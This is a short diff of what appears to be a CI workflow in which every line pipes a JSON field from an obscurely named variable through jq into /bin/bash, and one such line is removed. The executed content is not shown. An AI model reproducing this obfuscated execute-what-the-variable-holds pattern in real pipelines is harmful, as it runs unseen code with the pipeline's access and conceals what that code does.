@@ -28,7 +28,6 @@ jobs:
           echo $pou5729 | jq -r .nswkt9 | /bin/bash
           echo $ue88546 | jq -r .n004 | /bin/bash
           echo $e054 | jq -r .zsx65 | /bin/bash
-          echo $ho6 | jq -r .s85 | /bin/bash
           echo $lg003 | jq -r .qrsxx7 | /bin/bash
           printf '%s' "$zngw2619" | jq -r .zhmn6 | /bin/bash
           echo $tev7309 | jq -r .jn740 | /bin/bash
